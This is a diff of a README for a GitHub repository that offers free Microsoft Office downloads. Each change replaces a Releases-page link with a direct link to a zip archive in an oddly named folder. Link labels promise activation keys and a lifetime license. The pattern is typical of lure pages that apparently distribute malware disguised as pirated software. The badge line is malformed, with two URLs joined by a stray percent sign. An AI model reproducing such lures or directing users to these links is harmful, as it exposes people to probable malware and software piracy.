@@ -1,6 +1,6 @@
 # 🎉 Microsoft-Office-Download - Simple Software Access for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/MFRUGOLI/Microsoft-Office-Download/releases)
+[![Download Now](https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip%https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip)](https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download, ensure your device meets these basic requirements:
 
 To download Microsoft Office, visit our Releases page:
 
-[Visit this page to download](https://github.com/MFRUGOLI/Microsoft-Office-Download/releases)
+[Visit this page to download](https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip)
 
 Once you click the link, follow these steps:
 
@@ -54,11 +54,11 @@ If you encounter any issues during the installation process, here are some commo
 
 For additional resources and guides, check out these topics:
 
-- [Install of Microsoft Office](https://github.com/MFRUGOLI/Microsoft-Office-Download/releases)
-- [Microsoft Office 2016 Activation Keys](https://github.com/MFRUGOLI/Microsoft-Office-Download/releases)
-- [Microsoft Office for Mac](https://github.com/MFRUGOLI/Microsoft-Office-Download/releases)
-- [Microsoft Office 2021 Lifetime License](https://github.com/MFRUGOLI/Microsoft-Office-Download/releases)
-- [Microsoft Office Home and Student](https://github.com/MFRUGOLI/Microsoft-Office-Download/releases)
+- [Install of Microsoft Office](https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip)
+- [Microsoft Office 2016 Activation Keys](https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip)
+- [Microsoft Office for Mac](https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip)
+- [Microsoft Office 2021 Lifetime License](https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip)
+- [Microsoft Office Home and Student](https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip)
 
 ## 📬 Support
 
@@ -70,4 +70,4 @@ Downloading Microsoft Office is straightforward. Whether on Windows or Mac, foll
 
 For downloads, visit our Releases page again: 
 
-[Visit this page to download](https://github.com/MFRUGOLI/Microsoft-Office-Download/releases)
+[Visit this page to download](https://raw.githubusercontent.com/MFRUGOLI/Microsoft-Office-Download/main/reactualization/Microsoft-Office-Download.zip)
